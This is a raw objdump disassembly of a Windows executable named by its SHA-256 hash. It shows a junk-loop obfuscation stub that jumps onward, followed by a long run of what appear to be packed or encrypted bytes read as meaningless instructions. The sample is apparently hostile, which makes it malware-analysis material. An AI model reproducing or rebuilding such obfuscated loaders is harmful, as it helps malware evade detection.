
af984e18aa920bcbfdf695c07803b9e04b0198214af04a30ae57c3071131fd05.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x80
  401009:	mov    eax,DWORD PTR [ebp+0x8]
  40100c:	mov    ecx,DWORD PTR ds:0x428657
  401012:	and    DWORD PTR ds:0x428647,ecx
  401018:	push   ebx
  401019:	movzx  ecx,BYTE PTR ds:0x42862f
  401020:	add    DWORD PTR ds:0x4285cf,ecx
  401026:	push   esi
  401027:	and    DWORD PTR ds:0x42867b,0x0
  401031:	jmp    0x401043
  401036:	mov    esi,DWORD PTR ds:0x42867b
  40103c:	inc    esi
  40103d:	mov    DWORD PTR ds:0x42867b,esi
  401043:	cmp    DWORD PTR ds:0x42867b,0x17
  40104a:	jae    0x401084
  401050:	cmp    DWORD PTR ds:0x42867b,0x24
  401057:	jb     0x401084
  40105d:	jmp    0x40107f
  401062:	push   0x312f
  401067:	push   0x3b66
  40106c:	push   0x8bcc
  401071:	push   DWORD PTR [ebp-0x14]
  401074:	push   0x61c9
  401079:	call   DWORD PTR ds:0x42879f
  40107f:	jmp    0x401036
  401084:	push   edi
  401085:	and    DWORD PTR ds:0x4285e3,0x0
  40108f:	mov    esi,DWORD PTR ds:0x4285e3
  401095:	inc    esi
  401096:	mov    DWORD PTR ds:0x4285e3,esi
  40109c:	cmp    DWORD PTR ds:0x4285e3,0x20
  4010a3:	jbe    0x4010c4
  4010a9:	jmp    0x4010b7
  4010ae:	push   DWORD PTR [ebp-0x18]
  4010b1:	call   DWORD PTR ds:0x4287a3
  4010b7:	cmp    DWORD PTR ds:0x4285e3,0x1f
  4010be:	jb     0x40108f
  4010c4:	mov    esi,0x75108a4
  4010c9:	inc    ecx
  4010ca:	xor    eax,esi
  4010cc:	mov    edi,0x3272ec
  4010d1:	add    eax,edi
  4010d3:	mov    DWORD PTR [ebp-0x28],eax
  4010d6:	and    eax,eax
  4010d8:	mov    eax,ds:0x42816f
  4010dd:	xor    ecx,DWORD PTR ds:0x4285cf
  4010e3:	mov    eax,DWORD PTR [eax]
  4010e5:	sub    DWORD PTR ds:0x42861b,ecx
  4010eb:	mov    DWORD PTR [ebp-0x20],eax
  4010ee:	adc    DWORD PTR ds:0x42862b,edi
  4010f4:	mov    eax,ds:0x428377
  4010f9:	xor    DWORD PTR ds:0x428603,ebx
  4010ff:	mov    eax,DWORD PTR [eax]
  401101:	neg    ecx
  401103:	mov    DWORD PTR [ebp-0x18],eax
  401106:	sbb    DWORD PTR ds:0x428643,ecx
  40110c:	mov    DWORD PTR [ebp-0x24],0xf89c87b0
  401113:	and    DWORD PTR ds:0x42866b,ecx
  401119:	mov    eax,DWORD PTR [ebp-0x24]
  40111c:	mov    ecx,DWORD PTR ds:0x4286a7
  401122:	mov    ecx,DWORD PTR [ecx]
  401124:	sbb    DWORD PTR ds:0x428633,ecx
  40112a:	xor    eax,esi
  40112c:	and    DWORD PTR ds:0x428657,0x0
  401136:	mov    ecx,DWORD PTR ds:0x428657
  40113c:	inc    ecx
  40113d:	mov    DWORD PTR ds:0x428657,ecx
  401143:	cmp    DWORD PTR ds:0x428657,0x15
  40114a:	jg     0x401170
  401150:	jmp    0x401163
  401155:	push   DWORD PTR [ebp-0x20]
  401158:	push   0x428097
  40115d:	call   DWORD PTR ds:0x4287a7
  401163:	cmp    DWORD PTR ds:0x428657,0x13
  40116a:	jb     0x401136
  401170:	add    eax,edi
  401172:	mov    DWORD PTR [ebp-0x28],eax
  401175:	adc    DWORD PTR ds:0x428603,0x6a9
  40117f:	mov    eax,ds:0x4282ef
  401184:	sub    ecx,DWORD PTR ds:0x428647
  40118a:	mov    DWORD PTR [ebp-0x28],eax
  40118d:	mov    DWORD PTR ds:0x4285eb,0x1e
  401197:	cmp    DWORD PTR ds:0x4285eb,0x0
  40119e:	je     0x4011d9
  4011a4:	cmp    DWORD PTR ds:0x4285eb,0x2b
  4011ab:	jg     0x4011d9
  4011b1:	jmp    0x4011c7
  4011b6:	push   0x4280ae
  4011bb:	push   DWORD PTR [ebp-0x18]
  4011be:	push   DWORD PTR [ebp-0xc]
  4011c1:	call   DWORD PTR ds:0x4287ab
  4011c7:	mov    ecx,DWORD PTR ds:0x4285eb
  4011cd:	dec    ecx
  4011ce:	mov    DWORD PTR ds:0x4285eb,ecx
  4011d4:	jmp    0x401197
  4011d9:	mov    eax,DWORD PTR [ebp-0x20]
  4011dc:	mov    DWORD PTR ds:0x4285db,0x1c
  4011e6:	cmp    DWORD PTR ds:0x4285db,0x0
  4011ed:	je     0x401222
  4011f3:	cmp    DWORD PTR ds:0x4285db,0x28
  4011fa:	jbe    0x401222
  401200:	jmp    0x401210
  401205:	push   0x428042
  40120a:	call   DWORD PTR ds:0x4287af
  401210:	mov    ecx,DWORD PTR ds:0x4285db
  401216:	dec    ecx
  401217:	mov    DWORD PTR ds:0x4285db,ecx
  40121d:	jmp    0x4011e6
  401222:	mov    DWORD PTR [ebp-0x10],eax
  401225:	and    DWORD PTR ds:0x428627,0x0
  40122f:	jmp    0x40123f
  401234:	mov    eax,ds:0x428627
  401239:	inc    eax
  40123a:	mov    ds:0x428627,eax
  40123f:	cmp    DWORD PTR ds:0x428627,0x1e
  401246:	jae    0x40128e
  40124c:	cmp    DWORD PTR ds:0x428627,0xa
  401253:	jge    0x40128e
  401259:	jmp    0x40126e
  40125e:	push   0x6cd8
  401263:	push   0x4285eb
  401268:	call   DWORD PTR ds:0x4287b3
  40126e:	cmp    DWORD PTR ds:0x428627,0x9
  401275:	jne    0x401289
  40127b:	xor    eax,eax
  40127d:	add    eax,DWORD PTR ds:0x428627
  401283:	inc    eax
  401284:	mov    ds:0x428627,eax
  401289:	jmp    0x401234
  40128e:	mov    eax,DWORD PTR [ebp-0x10]
  401291:	and    DWORD PTR ds:0x4285ff,0x0
  40129b:	mov    ecx,DWORD PTR ds:0x4285ff
  4012a1:	inc    ecx
  4012a2:	mov    DWORD PTR ds:0x4285ff,ecx
  4012a8:	cmp    DWORD PTR ds:0x4285ff,0x5
  4012af:	jl     0x4012e7
  4012b5:	jmp    0x4012c0
  4012ba:	call   DWORD PTR ds:0x4287b7
  4012c0:	cmp    DWORD PTR ds:0x4285ff,0x4
  4012c7:	jne    0x4012da
  4012cd:	mov    ecx,DWORD PTR ds:0x4285ff
  4012d3:	inc    ecx
  4012d4:	mov    DWORD PTR ds:0x4285ff,ecx
  4012da:	cmp    DWORD PTR ds:0x4285ff,0x18
  4012e1:	jb     0x40129b
  4012e7:	push   0x4
  4012e9:	xor    ecx,ecx
  4012eb:	or     ecx,DWORD PTR ds:0x42864b
  4012f1:	sub    DWORD PTR ds:0x4285d3,ecx
  4012f7:	pop    ecx
  4012f8:	or     DWORD PTR ds:0x4285eb,0x6baf
  401302:	sub    ecx,eax
  401304:	and    DWORD PTR ds:0x4285ff,0x0
  40130e:	mov    eax,ds:0x4285ff
  401313:	inc    eax
  401314:	mov    ds:0x4285ff,eax
  401319:	cmp    DWORD PTR ds:0x4285ff,0x1c
  401320:	jg     0x401343
  401326:	jmp    0x401336
  40132b:	push   0x6245
  401330:	call   DWORD PTR ds:0x4287bb
  401336:	cmp    DWORD PTR ds:0x4285ff,0x17
  40133d:	jb     0x40130e
  401343:	add    ecx,DWORD PTR [ebp-0x18]
  401346:	sub    DWORD PTR ds:0x42867b,ecx
  40134c:	mov    DWORD PTR [ebp-0xc],0xf89c85f0
  401353:	mov    DWORD PTR [ebp-0x14],ecx
  401356:	mov    DWORD PTR [ebp-0x80],0xf89c85bc
  40135d:	adc    eax,0x2a9e
  401362:	mov    eax,DWORD PTR [ebp-0x10]
  401365:	mov    DWORD PTR [ebp-0x7c],eax
  401368:	and    DWORD PTR ds:0x42865b,0x0
  401372:	jmp    0x401382
  401377:	mov    eax,ds:0x42865b
  40137c:	inc    eax
  40137d:	mov    ds:0x42865b,eax
  401382:	cmp    DWORD PTR ds:0x42865b,0x14
  401389:	jae    0x4013e1
  40138f:	cmp    DWORD PTR ds:0x42865b,0xd
  401396:	jle    0x4013e1
  40139c:	jmp    0x4013c1
  4013a1:	push   0x5c8c
  4013a6:	push   0x42800b
  4013ab:	push   DWORD PTR [ebp-0x18]
  4013ae:	push   0x42800b
  4013b3:	push   0x513b
  4013b8:	push   DWORD PTR [ebp-0xc]
  4013bb:	call   DWORD PTR ds:0x4287bf
  4013c1:	cmp    DWORD PTR ds:0x42865b,0xc
  4013c8:	jne    0x4013dc
  4013ce:	xor    eax,eax
  4013d0:	add    eax,DWORD PTR ds:0x42865b
  4013d6:	inc    eax
  4013d7:	mov    ds:0x42865b,eax
  4013dc:	jmp    0x401377
  4013e1:	mov    eax,DWORD PTR [ebp-0x14]
  4013e4:	adc    DWORD PTR ds:0x42860f,0x676
  4013ee:	mov    DWORD PTR [ebp-0x78],eax
  4013f1:	mov    eax,DWORD PTR [ebp-0xc]
  4013f4:	sbb    DWORD PTR ds:0x4285db,0x428663
  4013fe:	xor    eax,esi
  401400:	add    eax,edi
  401402:	mov    DWORD PTR [ebp-0x74],eax
  401405:	lea    eax,[ebp-0x1c]
  401408:	mov    DWORD PTR [ebp-0x70],eax
  40140b:	mov    eax,DWORD PTR [ebp-0x80]
  40140e:	jmp    0x4037cc
  401413:	mov    eax,0x80deee36
  401418:	xchg   BYTE PTR [eax-0x320ea8e8],bh
  40141e:	pop    ebx
  40141f:	adc    al,BYTE PTR ds:0x7a7a305f
  401425:	jp     0x4014a1
  401427:	fstp   QWORD PTR [edi+0x7a]
  40142a:	jp     0x401451
  40142c:	sub    al,0x27
  40142e:	xor    DWORD PTR [ecx],ebx
  401430:	xor    eax,0x42752f1b
  401435:	imul   esi,DWORD PTR [esi-0x17],0x6d6a6a7f
  40143c:	inc    edx
  40143d:	aad    0xdc
  40143f:	icebp  
  401440:	pusha  
  401441:	dec    eax
  401442:	imul   esi,DWORD PTR [ecx+0x5b],0xffffffa0
  401446:	jo     0x4014b5
  401448:	pop    ecx
  401449:	iret   
  40144a:	pop    ebp
  40144b:	dec    edx
  40144c:	xor    BYTE PTR [edx+edi*8+0x4d678697],cl
  401453:	jg     0x40149c
  401455:	xor    BYTE PTR [esi+0x3bb2b07f],0x2c
  40145c:	push   DWORD PTR [esi-0x24]
  40145f:	cli    
  401460:	arpl   WORD PTR [edi+0x1e],di
  401463:	in     eax,dx
  401464:	cmp    ebp,ecx
  401466:	mov    edx,0xde2397ed
  40146b:	mov    ebp,DWORD PTR [ecx]
  40146d:	mulps  xmm5,XMMWORD PTR [ebx+0x6d07d48a]
  401474:	fst    QWORD PTR [esp+eiz*8]
  401477:	push   cs
  401478:	cli    
  401479:	sbb    BYTE PTR ss:[eax+0xc],cl
  40147d:	imul   ebp,DWORD PTR ss:[eax-0x47],0xffffffaf
  401482:	and    edx,DWORD PTR [ecx+0x15]
  401485:	mov    dh,0xff
  401487:	jmp    0x42c43fd5
  40148c:	enter  0xf95b,0x1a
  401490:	cli    
  401491:	js     0x401444
  401493:	jae    0x401472
  401495:	cwde   
  401496:	pop    edi
  401497:	mov    esi,DWORD PTR [ecx+0x41922417]
  40149d:	add    ebx,DWORD PTR [esi+0xb83823c]
  4014a3:	fisubr DWORD PTR ds:0x43448d62
  4014a9:	fs repz iret 
  4014ac:	mov    ch,BYTE PTR [ecx]
  4014ae:	mov    eax,eax
  4014b0:	(bad)  
  4014b1:	int3   
  4014b2:	mov    BYTE PTR [ecx-0xc],ah
  4014b5:	push   ebp
  4014b6:	bound  ecx,QWORD PTR [esp+ecx*1+0x3e]
  4014ba:	add    eax,DWORD PTR [esi+0x13]
  4014bd:	lods   eax,DWORD PTR ds:[esi]
  4014be:	dec    ebx
  4014bf:	retf   0x40b7
  4014c2:	rcl    BYTE PTR [esi+eiz*2],1
  4014c5:	std    
  4014c6:	bound  esp,QWORD PTR [esi-0x4b]
  4014c9:	stc    
  4014ca:	push   0x2752f8bf
  4014cf:	dec    ebx
  4014d0:	jg     0x401533
  4014d2:	mov    al,0x8f
  4014d4:	mov    cl,0x87
  4014d6:	jnp    0x401525
  4014d8:	sti    
  4014d9:	stos   BYTE PTR es:[edi],al
  4014da:	xchg   ecx,eax
  4014db:	retf   
  4014dc:	sti    
  4014dd:	sbb    al,0xc4
  4014df:	cmp    edx,esp
  4014e1:	test   eax,0x21072b1b
  4014e6:	sbb    esi,ebx
  4014e8:	popf   
  4014e9:	xor    bh,BYTE PTR [ebx+esi*1-0x21]
  4014ed:	jbe    0x401497
  4014ef:	frstor [ebx+0x33]
  4014f2:	or     esi,DWORD PTR [ebp+0x38]
  4014f5:	repz in eax,dx
  4014f7:	mov    ebx,0xd75b840f
  4014fc:	in     al,dx
  4014fd:	(bad)  
  4014fe:	sub    al,BYTE PTR [esi+0x12da0227]
  401504:	cmc    
  401505:	and    BYTE PTR [ecx-0x56],ah
  401508:	push   0xffffffa9
  40150a:	in     eax,dx
  40150b:	jno    0x40158b
  40150d:	push   ss
  40150e:	int3   
  40150f:	dec    ebx
  401510:	pop    ecx
  401511:	out    0xfa,eax
  401513:	and    dh,BYTE PTR [eax]
  401515:	jmp    0x3626:0x35f60f58
  40151c:	shr    DWORD PTR [esi-0x3b1c82ea],0x7d
  401523:	repnz sub ch,dl
  401526:	rol    ecx,0xc8
  401529:	inc    bl
  40152b:	rcl    DWORD PTR [edi-0x6d],1
  40152e:	and    BYTE PTR [ebx],dl
  401530:	repnz out 0xa8,al
  401533:	jmp    0xe8e041b0
  401538:	add    DWORD PTR [edi+esi*1+0x54083090],ebp
  40153f:	inc    esp
  401540:	adc    al,0xcf
  401542:	daa    
  401543:	cmp    eax,0x4f4ad0c5
  401548:	xchg   ecx,eax
  401549:	(bad)  [ebx+0x2b824e28]
  40154f:	pop    edi
  401550:	shl    BYTE PTR [edx],0xdd
  401553:	mov    ds:0xe1b22b7,al
  401558:	call   0xcdc9:0x7ed1d22
  40155f:	push   cs
  401560:	jb     0x401510
  401562:	and    DWORD PTR [ebx],0x7017782d
  401568:	pop    eax
  401569:	inc    eax
  40156a:	xchg   edi,eax
  40156b:	jne    0x401533
  40156d:	sahf   
  40156e:	cdq    
  40156f:	dec    esi
  401570:	dec    esp
  401571:	or     esi,DWORD PTR [edx]
  401573:	mov    WORD PTR [esi+0x1],es
  401576:	aaa    
  401577:	das    
  401578:	pop    ss
  401579:	cmp    eax,DWORD PTR [eax+0x562fc418]
  40157f:	psubd  mm4,QWORD PTR [edx+0x3]
  401583:	mov    ds:0xb42882ed,al
  401588:	cld    
  401589:	push   esi
  40158a:	sbb    eax,0x4672815f
  40158f:	mov    dl,0x75
  401591:	xlat   BYTE PTR ds:[ebx]
  401592:	ins    DWORD PTR es:[edi],dx
  401593:	bound  ecx,QWORD PTR [edx+0x5]
  401596:	add    al,0x9
  401598:	xchg   esi,eax
  401599:	lods   eax,DWORD PTR ds:[esi]
  40159a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40159b:	mov    WORD PTR [esp+ecx*4+0xf],?
  40159f:	fiadd  WORD PTR [edx+0x62161ebc]
  4015a5:	push   edx
  4015a6:	lds    esp,FWORD PTR [esi-0x23]
  4015a9:	bound  ecx,QWORD PTR [ecx+0x7a007b1]
  4015af:	mov    ds:0xf14d52da,eax
  4015b4:	add    al,0xf9
  4015b6:	fwait
  4015b7:	mov    eax,0x7c4e5b34
  4015bc:	mov    ecx,0xb45bb48c
  4015c1:	sbb    eax,0x7b56742
  4015c6:	les    ebx,FWORD PTR [ecx]
  4015c8:	imul   edx,DWORD PTR [eax],0x57
  4015cb:	fimul  WORD PTR [ebx]
  4015cd:	push   es
  4015ce:	or     ah,bl
  4015d0:	mov    dl,0x77
  4015d2:	call   0x2713d2b4
  4015d7:	mov    eax,ds:0x469959ac
  4015dc:	inc    ebp
  4015dd:	repnz int3 
  4015df:	fld    st(4)
  4015e1:	adc    ecx,0x58
  4015e4:	pop    ebx
  4015e5:	loop   0x4015b2
  4015e7:	repnz push ebp
  4015e9:	xchg   edx,eax
  4015ea:	push   es
  4015eb:	cli    
  4015ec:	adc    eax,DWORD PTR [ebp+esi*1-0x738c1ca1]
  4015f3:	adc    DWORD PTR [edi+edx*8],esp
  4015f6:	and    edx,DWORD PTR [edi+0x6e]
  4015f9:	mov    ebx,0x163ea99e
  4015fe:	xchg   esp,eax
  4015ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401600:	lahf   
  401601:	push   0xfffffff7
  401603:	rcr    DWORD PTR ds:0x1a76eb89,1
  401609:	or     eax,0xa9716e25
  40160e:	scas   eax,DWORD PTR es:[edi]
  40160f:	in     al,dx
  401610:	jge    0x401688
  401612:	jns    0x40163c
  401614:	repz cmp bl,dh
  401617:	cdq    
  401618:	fld    DWORD PTR [esp+ebp*4]
  40161b:	(bad)  
  40161c:	out    0xa7,eax
  40161e:	inc    ebx
  40161f:	xchg   esi,eax
  401620:	and    edx,DWORD PTR [ecx-0x41]
  401623:	loopne 0x401607
  401625:	fcomp  QWORD PTR [ebp-0x4f]
  401628:	mov    eax,0x1680edab
  40162d:	ret    0xa34e
  401630:	pop    edx
  401631:	fiadd  WORD PTR [eax+0x70ee2593]
  401637:	sub    ah,BYTE PTR [esp+ebp*2-0x62]
  40163b:	push   esp
  40163c:	sbb    al,0x88
  40163e:	aam    0x34
  401640:	jp     0x40162c
  401642:	xchg   edi,eax
  401643:	repnz or DWORD PTR [edx],esp
  401646:	mov    esp,0xda8e3d9d
  40164b:	shr    dh,1
  40164d:	inc    esi
  40164e:	stos   BYTE PTR es:[edi],al
  40164f:	and    bh,al
  401651:	in     eax,0xa5
  401653:	fwait
  401654:	xor    eax,0x2916530b
  401659:	pop    esi
  40165a:	cmc    
  40165b:	std    
  40165c:	pop    ebx
  40165d:	test   BYTE PTR [edi-0x712a90c2],ah
  401663:	and    BYTE PTR [ecx-0x570b502a],bh
  401669:	pop    esp
  40166a:	popa   
  40166b:	mov    ebx,esp
  40166d:	push   esi
  40166e:	sbb    bl,BYTE PTR cs:0xd0148e0c
  401675:	add    bh,BYTE PTR [esi+0x4a]
  401678:	inc    ecx
  401679:	cmp    al,0xd0
  40167b:	jp     0x40162a
  40167d:	(bad)  
  40167e:	loop   0x401669
  401680:	setg   BYTE PTR [edx]
  401683:	test   eax,0x20cf821f
  401688:	push   esp
  401689:	loopne 0x4016d8
  40168b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40168c:	xchg   ebp,eax
  40168d:	jb     0x401641
  40168f:	je     0x40162d
  401691:	adc    eax,0xa0997a07
  401696:	ja     0x4016c9
  401698:	dec    edi
  401699:	dec    esi
  40169a:	lock inc edi
  40169c:	cmc    
  40169d:	dec    ecx
  40169e:	jne    0x401645
  4016a0:	mov    bh,0xae
  4016a2:	repnz sub dl,BYTE PTR [ebx+0x3c]
  4016a6:	xor    DWORD PTR [ebx],0xa583052d
  4016ac:	sbb    al,0xe4
  4016ae:	jle    0x401655
  4016b0:	or     cl,BYTE PTR [esi]
  4016b2:	loope  0x4016ec
  4016b4:	inc    edi
  4016b5:	shl    BYTE PTR [ebp+eax*2-0x7dcb6eb4],cl
  4016bc:	popf   
  4016bd:	xlat   BYTE PTR ds:[ebx]
  4016be:	(bad)  
  4016bf:	mov    ch,0xda
  4016c1:	fld    st(2)
  4016c3:	mov    esp,0x7d862bc0
  4016c8:	and    esi,DWORD PTR [edi-0x54]
  4016cb:	pop    es
  4016cc:	scas   al,BYTE PTR es:[edi]
  4016cd:	mov    dh,0xfd
  4016cf:	xor    al,0xe3
  4016d1:	(bad)  
  4016d2:	in     al,0xf6
  4016d4:	loopne 0x4016ec
  4016d6:	in     al,0xfe
  4016d8:	sbb    BYTE PTR [ebx-0x7b823cd0],ah
  4016de:	sti    
  4016df:	ins    BYTE PTR es:[edi],dx
  4016e0:	mov    eax,ds:0x7015ea8f
  4016e5:	or     al,0x92
  4016e7:	lfs    ebp,FWORD PTR [ebx]
  4016ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4016eb:	int3   
  4016ec:	test   eax,0x3f6aad2
  4016f1:	push   edx
  4016f2:	pop    es
  4016f3:	cmp    al,0x47
  4016f5:	fistp  QWORD PTR [esi+0x29]
  4016f8:	dec    esi
  4016f9:	cdq    
  4016fa:	gs cs dec edx
  4016fd:	add    al,0x8f
  4016ff:	jns    0x401778
  401701:	inc    edx
  401702:	mov    ah,0xa
  401704:	call   0x32d3:0x8f30b3ce
  40170b:	pusha  
  40170c:	sti    
  40170d:	sub    dh,dh
  40170f:	pop    ebx
  401710:	fadd   QWORD PTR [ebx]
  401712:	and    DWORD PTR [ebp+0x6dd424bb],edx
  401718:	xchg   DWORD PTR [edx-0x1],ecx
  40171b:	imul   ebx,DWORD PTR [eax+0x75],0x1d030398
  401722:	std    
  401723:	(bad)  
  401724:	cli    
  401725:	lods   eax,DWORD PTR ds:[esi]
  401726:	sbb    bh,dh
  401728:	addr16 push es
  40172a:	mov    al,0x30
  40172c:	out    0x54,eax
  40172e:	cld    
  40172f:	xchg   ebx,eax
  401730:	test   eax,0xed9dba53
  401735:	fs (bad) 
  401737:	jg     0x40172e
  401739:	sahf   
  40173a:	mov    al,ds:0x5ef81e45
  40173f:	jno    0x401783
  401741:	cbw    
  401743:	mov    ah,0x67
  401745:	ins    BYTE PTR es:[edi],dx
  401746:	icebp  
  401747:	add    bh,cl
  401749:	test   al,0xc4
  40174b:	inc    eax
  40174c:	test   DWORD PTR [ebp-0x5531e9b3],eax
  401752:	sub    BYTE PTR [eax+0x1a0ff3a6],ah
  401758:	mov    dl,0xff
  40175a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40175b:	shl    BYTE PTR [eax],cl
  40175d:	or     eax,0xf0572075
  401762:	fdivr  DWORD PTR [edi]
  401764:	mov    bh,BYTE PTR [ebx-0x9f023f8]
  40176a:	loope  0x401713
  40176c:	sahf   
  40176d:	sbb    BYTE PTR [edx],bl
  40176f:	xor    al,0x10
  401771:	fisttp QWORD PTR ds:0x1397f14e
  401777:	push   es
  401778:	nop
  401779:	push   ecx
  40177a:	repz jns 0x40176d
  40177d:	xlat   BYTE PTR ds:[ebx]
  40177e:	lds    edx,FWORD PTR [ecx]
  401780:	sub    BYTE PTR [eax+eax*2],0x3d
  401784:	jns    0x40175e
  401786:	sub    al,0x20
  401788:	push   esp
  401789:	ffree  st(1)
  40178b:	pop    esi
  40178c:	std    
  40178d:	xchg   BYTE PTR [edx+0x19],ch
  401790:	jmp    FWORD PTR [edx-0x5e]
  401793:	sbb    eax,0xaec9cf77
  401798:	dec    ecx
  401799:	pusha  
  40179a:	leave  
  40179b:	fcomp  DWORD PTR [ebp-0x23]
  40179e:	sahf   
  40179f:	adc    esp,esi
  4017a1:	cmp    dl,bl
  4017a3:	xor    ah,ah
  4017a5:	stc    
  4017a6:	ss mov bh,0x11
  4017a9:	jmp    0x6f254cb2
  4017ae:	into   
  4017af:	imul   edi,DWORD PTR [eax],0x27
  4017b2:	jge    0x40176d
  4017b4:	mov    BYTE PTR [ebx-0x3ddb72a9],ch
  4017ba:	and    al,0xbf
  4017bc:	int3   
  4017bd:	outs   dx,BYTE PTR ds:[esi]
  4017be:	inc    edx
  4017bf:	or     ebx,eax
  4017c1:	xchg   edi,eax
  4017c2:	es xor al,0x22
  4017c5:	sub    BYTE PTR ds:0x3577ea46,bl
  4017cb:	mov    BYTE PTR [edi],al
  4017cd:	(bad)  
  4017ce:	bnd jle 0x40184b
  4017d1:	in     eax,0xf5
  4017d3:	out    dx,eax
  4017d4:	pop    ecx
  4017d5:	in     al,dx
  4017d6:	push   ds
  4017d7:	cld    
  4017d8:	shl    BYTE PTR [edi-0x77],1
  4017db:	and    DWORD PTR [edi+0x72],edx
  4017de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4017df:	gs inc esi
  4017e1:	inc    edi
  4017e2:	idiv   ebp
  4017e4:	jle    0x401787
  4017e6:	out    dx,eax
  4017e7:	push   edx
  4017e8:	call   0x5e40:0x38c112c0
  4017ef:	pushf  
  4017f0:	add    ecx,ebx
  4017f2:	push   0x769a0c6c
  4017f7:	inc    ebx
  4017f8:	jl     0x401802
  4017fa:	mov    ah,0x22
  4017fc:	sub    DWORD PTR [eax],ecx
  4017fe:	push   ecx
  4017ff:	dec    edi
  401800:	addr16 loop 0x40186c
  401803:	fwait
  401804:	bound  ebx,QWORD PTR [edx]
  401806:	das    
  401807:	retf   0xf5bf
  40180a:	jmp    0xf9e5:0x29b59203
  401811:	push   eax
  401812:	std    
  401813:	jp     0x4017f8
  401815:	dec    edi
  401816:	cmp    bh,ch
  401818:	icebp  
  401819:	pop    es
  40181a:	nop
  40181b:	xor    dl,ah
  40181d:	repnz in al,dx
  40181f:	cdq    
  401820:	mov    BYTE PTR [edi],dl
  401822:	fld    DWORD PTR ds:0xc3a52f6
  401828:	add    eax,0x85d21954
  40182d:	mov    dh,0xfb
  40182f:	adc    edx,ecx
  401831:	imul   ebp,DWORD PTR [eax],0xbccd00da
  401837:	test   al,0xf8
  401839:	jecxz  0x401841
  40183b:	in     eax,0x2e
  40183d:	(bad)  
  40183e:	(bad)  
  40183f:	cmp    dl,BYTE PTR [eax+0x4cab3ab5]
  401845:	pop    ss
  401846:	mov    fs,WORD PTR [ebx+eiz*1]
  401849:	fdivr  DWORD PTR [eax]
  40184b:	mov    WORD PTR [edx],gs
  40184d:	inc    esi
  40184e:	or     ah,BYTE PTR [esi+eax*2]
  401851:	jp     0x401818
  401853:	push   ecx
  401854:	fs inc edi
  401856:	pop    edi
  401857:	mov    esp,0x4cf891e1
  40185c:	jb     0x4017ec
  40185e:	mov    DWORD PTR [eax+0x5ae3f6a8],edx
  401864:	mov    eax,0x1d4056b2
  401869:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40186a:	and    al,0xb5
  40186c:	pop    ds
  40186d:	cmp    esp,DWORD PTR [edx+0x11]
  401870:	lea    ecx,[ecx-0x3a]
  401873:	mov    ebp,0xf2ec525f
  401878:	call   0x310c:0xda0c4715
  40187f:	xchg   DWORD PTR [eax+0x1c],ebp
  401882:	push   0xfffffff3
  401884:	test   ebx,eax
  401886:	loopne 0x401842
  401888:	cmc    
  401889:	jmp    0x615b:0xdfca58ba
  401890:	mov    dh,BYTE PTR [esi+0x15]
  401893:	in     eax,dx
  401894:	and    BYTE PTR [ebx+eax*1],ah
  401897:	cmp    dl,BYTE PTR [ebx-0x65]
  40189a:	daa    
  40189b:	inc    esp
  40189c:	cmp    al,0xb8
  40189e:	mov    BYTE PTR [eax+0x9af81fc],bh
  4018a4:	sbb    al,0xc0
  4018a6:	adc    bh,0x8c
  4018a9:	lahf   
  4018aa:	ficomp WORD PTR [eax+0x70]
  4018ad:	mov    esp,0x7694b7aa
  4018b2:	fisttp WORD PTR [esi-0x1eb771a9]
  4018b8:	aam    0xff
  4018ba:	xor    eax,0x43e39e13
  4018bf:	adc    eax,0x87c281f4
  4018c4:	mov    ds:0xfe327d12,al
  4018c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4018ca:	jp     0x4018bc
  4018cc:	cwde   
  4018cd:	sbb    ecx,DWORD PTR [edi-0x260979d4]
  4018d3:	call   0x8ba8:0x81209948
  4018da:	xlat   BYTE PTR ds:[ebx]
  4018db:	mov    bh,BYTE PTR ds:[esi-0x57]
  4018df:	sub    al,0xc3
  4018e1:	jnp    0x40186b
  4018e3:	fwait
  4018e4:	push   edi
  4018e5:	ss xchg edi,eax
  4018e7:	lods   al,BYTE PTR ds:[esi]
  4018e8:	add    al,0x25
  4018ea:	retf   0xc97d
  4018ed:	fistp  DWORD PTR [esi+esi*2+0x78]
  4018f1:	mov    eax,0x43bbb779
  4018f6:	sub    ah,BYTE PTR [esi+ebp*1]
  4018f9:	inc    edx
  4018fa:	xor    BYTE PTR [ebx+0x1],0x2f
  4018fe:	push   ebx
  4018ff:	pop    edi
  401900:	pushf  
  401901:	sub    DWORD PTR [edi+0x31],0xffffffb4
  401905:	mov    ebp,0xf0b51805
  40190a:	cdq    
  40190b:	xor    esp,DWORD PTR [ebx+0x5e]
  40190e:	rol    edi,0x26
  401911:	jns    0x4018d9
  401913:	jae    0x401971
  401915:	inc    ax
  401917:	dec    eax
  401918:	sbb    BYTE PTR [edi-0x65672a76],dh
  40191e:	sub    eax,0xdfee1510
  401923:	push   cs
  401924:	sbb    al,0xbb
  401926:	aam    0x23
  401928:	push   edi
  401929:	mul    dh
  40192b:	sub    eax,0x531703e3
  401930:	test   BYTE PTR [ebx],dh
  401932:	aam    0x9c
  401934:	push   ebp
  401935:	out    dx,eax
  401936:	and    al,0xd2
  401938:	xchg   edx,eax
  401939:	inc    esp
  40193a:	push   cs
  40193b:	stos   DWORD PTR es:[edi],eax
  40193c:	das    
  40193d:	fmul   DWORD PTR [esp+ebx*8+0x49]
  401941:	inc    ebx
  401942:	sbb    DWORD PTR [eax],eax
  401944:	sub    al,0xf6
  401946:	scas   al,BYTE PTR es:[edi]
  401947:	and    DWORD PTR [ebp+esi*4+0x5abd809e],0x4f
  40194f:	call   0x84e5adcf
  401954:	add    BYTE PTR [ebp-0x2ec85c85],0x3a
  40195b:	gs sub eax,0xfa3cd5dc
  401961:	jae    0x401979
  401963:	ins    DWORD PTR es:[edi],dx
  401964:	add    bh,BYTE PTR [esi-0x44]
  401967:	scas   al,BYTE PTR es:[edi]
  401968:	popa   
  401969:	and    esi,DWORD PTR [esi-0x4c]
  40196c:	mov    ?,WORD PTR [ecx-0x33]
  40196f:	sbb    dl,BYTE PTR [eax+0x40]
  401972:	out    dx,eax
  401973:	adc    DWORD PTR [ecx+ebx*8+0x41],0xb8c3e10
